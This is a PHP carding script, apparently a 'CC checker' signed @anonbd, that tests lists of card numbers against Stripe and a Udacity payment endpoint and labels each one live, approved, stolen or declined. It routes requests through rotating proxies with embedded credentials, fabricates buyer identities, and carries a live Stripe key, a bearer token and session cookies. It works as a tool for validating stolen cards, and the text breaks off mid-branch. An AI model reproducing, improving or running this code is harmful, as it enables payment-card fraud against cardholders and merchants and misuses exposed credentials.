<?php

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY @ANONBD]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#
 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
/////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'allhxpvu-rotate:xksjbgb5y21k',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
//$ip = $ip1;
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'authority: api.stripe.com',
  'method: POST',
  'path: /v1/tokens',
  'scheme: https',
  'accept: application/json',
  'accept-language: en-US,en;q=0.5',
  'content-type: application/x-www-form-urlencoded',
  'origin: https://js.stripe.com',
  'referer: https://js.stripe.com/',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: same-site',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
  ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&muid=c7750d0a-158c-4138-86df-1562336d635fb51684&sid=c640436e-e9a7-40e6-b4ae-d4c487974f1d31c10f&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=43647&key=pk_live_4ubp5nwZfwTgHyToeeygtLYh&pasted_fields=number');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://payment.udacity.com/api/braavos/users/df5eacac-a8b8-11ec-b8fd-83bff04c2825/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: payment.udacity.com',
'method: POST',
'path: /api/braavos/users/df5eacac-a8b8-11ec-b8fd-83bff04c2825/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5',
'content-type: application/x-www-form-urlencoded',
'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTA0MTkyNTEsImlhdCI6MTY0NzgyNzI1MSwia2lkIjoiMTAwMCIsInVpZCI6ImRmNWVhY2FjLWE4YjgtMTFlYy1iOGZkLTgzYmZmMDRjMjgyNSIsImRvbSI6IlVTIn0.kFwpqAamL8ku05cwN7NxGIUINceKCJdjyXB090lIAwIWpwI_OOAY9EXyjBFjrVopV2idQzOT4NMBkMeqlSp1huZhe0R6mMxu4TxMzPReLmZOppFuTRjYcM3Zt1Jx4Tkz9aSZ_QxtXd8uwA9YDJCoqWSWgIM8bMAdKeQqsHjUbSANfyWLoG6OUvxB7UqSz5fzbdS_NKa1hrJVg8G5QtGA9CKgYGdb-lWNu_v5F56dzem7rJjJNYdrmdDsNOIMlsnHGABYQHM8WqfZJaHyDGVrOqcBdJsEQ6ydZfRYMZb1tNMm893V1-yp5tYQc0rjSTefhJYq8UQKM_sqriqo0QKuCA',
'Cookie: __cf_bm=q_TJl4NiupHwZHofEs8mdf3M.x3sEY18N.G7EbzmTPQ-1647827217-0-AZsK0xRU6vYJKjKUyvL/tZG4y8fQ8Fl3Cdrbs/XDeH7ylsvjnNI30pXhM5ybZNzE784VfM4iqfWwyxCibR2S8UZnrG8Z2RougX+TPZ2hitpQ; _jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTA0MTkyNTEsImlhdCI6MTY0NzgyNzI1MSwia2lkIjoiMTAwMCIsInVpZCI6ImRmNWVhY2FjLWE4YjgtMTFlYy1iOGZkLTgzYmZmMDRjMjgyNSIsImRvbSI6IlVTIn0.kFwpqAamL8ku05cwN7NxGIUINceKCJdjyXB090lIAwIWpwI_OOAY9EXyjBFjrVopV2idQzOT4NMBkMeqlSp1huZhe0R6mMxu4TxMzPReLmZOppFuTRjYcM3Zt1Jx4Tkz9aSZ_QxtXd8uwA9YDJCoqWSWgIM8bMAdKeQqsHjUbSANfyWLoG6OUvxB7UqSz5fzbdS_NKa1hrJVg8G5QtGA9CKgYGdb-lWNu_v5F56dzem7rJjJNYdrmdDsNOIMlsnHGABYQHM8WqfZJaHyDGVrOqcBdJsEQ6ydZfRYMZb1tNMm893V1-yp5tYQc0rjSTefhJYq8UQKM_sqriqo0QKuCA; ajs_anonymous_id="79c3b42d-9cfe-4038-842d-d330deef0abe"; ajs_created_at=1647827269174; viewer_region=C; viewer_in_EU=false; viewer_country=BD; dismissed_personalized-discount-3_autopop_modal=true; __stripe_mid=c7750d0a-158c-4138-86df-1562336d635fb51684; __stripe_sid=c640436e-e9a7-40e6-b4ae-d4c487974f1d31c10f',
'origin: https://payment.udacity.com',
'referer: https://payment.udacity.com/subscribe/21848270?&payment_plan=recurring',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'X-Requested-With: XMLHttpRequest',
));
# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"provider":"stripe","data":{},"card_token":"tok_0KfaMkCKlixHofkasz8pww7S"}');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

///////////////////////// Bin Lookup Api //////////////////////////

// this is for additional info - so result will look more good by adding the info of the bin

$bin = substr("$cc", 0, 6);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$type = getStr($fim, '"type":"', '"');

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
curl_close($ch);


if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
 return "$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}

# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #



# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo '</br><span class="badge badge-success"APPROVED!</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CVC MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

elseif
(strpos($result2,  "Thank You For Donation.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

elseif
(strpos($result2,  '"Thank You For Donation."')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

elseif
(strpos($result2,  "Thank You.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Your Card Zip Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation. }</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

elseif
(strpos($result2,  "incorrect_zip")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Incorrect Zip}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 


elseif
(strpos($result2,  '"type":"one-time"')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CCV MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
} 

# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #



# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #

elseif
(strpos($result2,  'security code is incorrect.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  'security code is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  "Your card's security code is incorrect.")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Your Card&#039;s Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  }

elseif
(strpos($result2,  "incorrect_cvc")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Incorrect CVC.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #



#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #

elseif
(strpos($result2,  "stolen_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Stolen Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  "lost_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Lost Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Your Card Has Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  "pickup_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Pickup Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  "insufficient_funds")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- CVC FAILED.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

elseif
(strpos($result2,  'security code is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
}

# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #



# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #

elseif
(strpos($result2,  'Your card has expired.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your card number is incorrect.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "incorrect_number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  'card was declined.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Was Declined</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "generic_decline")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Generic Decline</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "do_not_honor")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Do Not Honor The Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 


elseif
(strpos($result2,  "expired_card")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Does Not Support This Type Of Purchase.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "processing_error")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Processing Error</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2, "service_not_allowed")) {
